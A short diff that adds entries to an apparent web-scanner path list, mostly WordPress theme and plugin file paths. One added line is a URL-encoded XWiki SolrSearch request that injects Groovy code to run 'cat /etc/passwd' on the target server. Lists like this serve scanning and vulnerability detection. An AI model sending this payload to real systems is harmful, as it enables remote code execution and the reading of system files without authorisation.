@@ -3847,3 +3847,5 @@ pathCache.php
 /AHT/AHT_UI/public/js/app.min.js
 /wp-content/themes/histudy/style.css
 /wp-content/themes/karzo/style.css
+/wp-content/plugins/wp-full-stripe-free/readme.txt
+/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20
